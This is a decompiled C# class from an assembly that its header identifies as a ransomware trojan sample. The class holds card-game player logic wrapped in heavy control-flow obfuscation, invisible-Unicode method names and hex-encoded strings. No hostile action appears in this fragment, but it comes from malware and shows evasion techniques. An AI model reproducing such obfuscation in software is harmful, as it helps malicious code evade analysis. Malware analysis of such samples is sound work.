// Decompiled with JetBrains decompiler
// Type: Cytotechnologist.Player
// Assembly: Encod, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: 4DCFB260-FACB-496A-9BC9-FA9701DCBF71
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-d5f77ba2b2ad58cfad5ae3111994ad0f889967e6d4f67ecb9cedf1b8f10a6149.exe

using SimpleJSON;
using System.Runtime.InteropServices;

namespace Cytotechnologist
{
  public class Player
  {
    public static string MembershipCondition(int BaseStream)
    {
      string str1 = (string) null;
      bool flag = BaseStream == 0;
label_1:
      int num1 = -733855215;
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -994510914)) % 10U)
        {
          case 0:
            int num3;
            num1 = num3 = BaseStream != 1 ? -1097321069 : (num3 = -1560423688);
            continue;
          case 1:
            str1 = "436F6D706C6574654F6E436F756E74646F776E50726F6D69";
            num1 = (int) num2 * 1879672580 ^ -1273016474;
            continue;
          case 2:
            num1 = (int) num2 * -1851377645 ^ -2043026857;
            continue;
          case 3:
            str2 = str1;
            num1 = -1531854032;
            continue;
          case 4:
            num1 = (int) num2 * -96512544 ^ 1677150181;
            continue;
          case 6:
            num1 = (int) num2 * -965354968 ^ -319994253;
            continue;
          case 7:
            int num4 = flag ? -1040324602 : (num4 = -726548510);
            num1 = num4 ^ (int) num2 * -123276604;
            continue;
          case 8:
            str1 = "59414F";
            num1 = (int) num2 * 1623750312 ^ -442069917;
            continue;
          case 9:
            goto label_1;
          default:
            goto label_11;
        }
      }
label_11:
      return str2;
    }

    public string Name { get; private set; }

    private int[] PlanningCards { get; set; }

    public bool UseOneMorePlanningSprint { get; private set; }

    public int PlannedForCard(int cardTypeIndex)
    {
      if (this.PlanningCards.Length != 0)
        goto label_4;
label_1:
      int num1 = -1541663937;
label_2:
      uint num2;
      int num3;
      int num4;
      switch ((num2 = (uint) (num1 ^ -867731334)) % 3U)
      {
        case 0:
          goto label_1;
        case 2:
          num4 = 0;
          goto label_5;
        default:
          return num3;
      }
label_4:
      num4 = this.PlanningCards[cardTypeIndex];
label_5:
      num3 = num4;
      num1 = -1333492799;
      goto label_2;
    }

    public int PlanningCardsCount
    {
      get
      {
label_1:
        int num1 = -768795894;
        int num2;
        bool flag;
        int num3;
        int[] planningCards;
        int index;
        int planningCardsCount;
        while (true)
        {
          uint num4;
          switch ((num4 = (uint) (num1 ^ -1056591244)) % 15U)
          {
            case 0:
              num1 = (int) num4 * -930526773 ^ 1954269672;
              continue;
            case 1:
              planningCards = this.PlanningCards;
              index = 0;
              num1 = (int) num4 * 1110063520 ^ 91476472;
              continue;
            case 2:
              num1 = -1644411904;
              continue;
            case 3:
              flag = num2 > 0;
              num1 = (int) num4 * -1488563041 ^ 588825918;
              continue;
            case 4:
              num1 = (int) num4 * -233707892 ^ 718746975;
              continue;
            case 6:
              int num5 = flag ? -1904139438 : (num5 = -1316300519);
              num1 = num5 ^ (int) num4 * 1223410602;
              continue;
            case 7:
              ++num3;
              num1 = (int) num4 * -1499346362 ^ 1045051695;
              continue;
            case 8:
              int num6;
              num1 = num6 = index < planningCards.Length ? -2084503139 : (num6 = -1409086517);
              continue;
            case 9:
              num3 = 0;
              num1 = (int) num4 * 1125540146 ^ 866929348;
              continue;
            case 10:
              num1 = (int) num4 * -1311965305 ^ -1055089975;
              continue;
            case 11:
              planningCardsCount = num3;
              num1 = (int) num4 * 2107837219 ^ 306424181;
              continue;
            case 12:
              goto label_1;
            case 13:
              ++index;
              num1 = (int) num4 * -2077161992 ^ 1695411212;
              continue;
            case 14:
              num2 = planningCards[index];
              num1 = -1704460036;
              continue;
            default:
              goto label_16;
          }
        }
label_16:
        return planningCardsCount;
      }
    }

    private Player()
    {
    }

    public string PlanningCardsToString()
    {
      string str1 = " ";
      int index = 0;
label_1:
      int num1 = -1936281857;
      bool flag1;
      int planningCard;
      bool flag2;
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -265179202)) % 11U)
        {
          case 0:
            num1 = (int) num2 * -1269594183 ^ 1841105408;
            continue;
          case 1:
            str1 = Player.\u206E⁪‎⁭‪‭‪‬‎‪⁯⁫‮‬⁪‎​‫‫‍‎‫‎‫‍⁪‬‫‌‍‮‎‏‭⁯⁪⁪‪‏⁯‮(new string[5]
            {
              str1,
              Card.CardTypeNames[index],
              "x",
              planningCard.ToString(),
              " "
            });
            num1 = -1998295517;
            continue;
          case 2:
            num1 = (int) num2 * -1886624676 ^ -187790126;
            continue;
          case 3:
            flag1 = index < this.PlanningCards.Length;
            num1 = -1409520192;
            continue;
          case 4:
            int num3 = !flag2 ? -736330522 : (num3 = -1447766799);
            num1 = num3 ^ (int) num2 * 1129487075;
            continue;
          case 5:
            int num4 = !flag1 ? -1341587494 : (num4 = -105039633);
            num1 = num4 ^ (int) num2 * -1363791329;
            continue;
          case 6:
            str2 = str1;
            num1 = (int) num2 * 1564567785 ^ -248774851;
            continue;
          case 8:
            ++index;
            num1 = -205300850;
            continue;
          case 9:
            planningCard = this.PlanningCards[index];
            flag2 = planningCard == 0;
            num1 = -1617789502;
            continue;
          case 10:
            goto label_1;
          default:
            goto label_12;
        }
      }
label_12:
      return str2;
    }

    public static Player Deserialize(JSONNode json)
    {
label_1:
      int num1 = 1973996148;
      Player player;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1791247893)) % 3U)
        {
          case 1:
            player = new Player()
            {
              Name = json["name"].Value,
              PlanningCards = Player.ParsePlanningCards(json["planning-cards"]),
              UseOneMorePlanningSprint = json["use-one-more-planning-sprint"].AsBool
            };
            num1 = (int) num2 * 2033634176 ^ 1550314847;
            continue;
          case 2:
            goto label_1;
          default:
            goto label_4;
        }
      }
label_4:
      return player;
    }

    private static int[] ParsePlanningCards(JSONNode json)
    {
label_1:
      int num1 = 940384379;
      int aIndex;
      int count;
      int[] numArray;
      int[] planningCards;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 531484365)) % 8U)
        {
          case 0:
            goto label_1;
          case 1:
            ++aIndex;
            num1 = (int) num2 * -1775429350 ^ -1205587915;
            continue;
          case 2:
            int num3;
            num1 = num3 = aIndex < count ? 826456518 : (num3 = 129964793);
            continue;
          case 3:
            numArray[aIndex] = json[aIndex].AsInt;
            num1 = 1021123116;
            continue;
          case 4:
            planningCards = numArray;
            num1 = (int) num2 * -989718390 ^ 143575816;
            continue;
          case 5:
            num1 = (int) num2 * -1457482237 ^ 122181221;
            continue;
          case 6:
            count = json.Count;
            numArray = new int[count];
            aIndex = 0;
            num1 = (int) num2 * 938921121 ^ -1061449831;
            continue;
          default:
            goto label_9;
        }
      }
label_9:
      return planningCards;
    }

    public override string ToString()
    {
label_1:
      int num1 = -687511129;
      string str;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -436557744)) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num2 * -696382068 ^ 1231824038;
            continue;
          case 3:
            str = Player.\u206C⁫​⁪‏‬⁪‍⁮‮⁭⁬‏⁪⁫⁯⁪‌⁬⁬‌‎‫‫‫‬​‎​‫‮⁭⁫‬⁯‭⁬⁮⁪‌‮("name: {0},\nplanning-cards: [{1}]\nuse-one-more-planning-sprint: {2}", (object) this.Name, (object) this.PlanningCardsToString(), (object) this.UseOneMorePlanningSprint);
            num1 = (int) num2 * -1119644734 ^ 1277072191;
            continue;
          default:
            goto label_5;
        }
      }
label_5:
      return str;
    }

    static string \u206E⁪‎⁭‪‭‪‬‎‪⁯⁫‮‬⁪‎​‫‫‍‎‫‎‫‍⁪‬‫‌‍‮‎‏‭⁯⁪⁪‪‏⁯‮([In] string[] obj0) => string.Concat(obj0);

    static string \u206C⁫​⁪‏‬⁪‍⁮‮⁭⁬‏⁪⁫⁯⁪‌⁬⁬‌‎‫‫‫‬​‎​‫‮⁭⁫‬⁯‭⁬⁮⁪‌‮(
      [In] string obj0,
      [In] object obj1,
      [In] object obj2,
      [In] object obj3)
    {
      return string.Format(obj0, obj1, obj2, obj3);
    }
  }
}
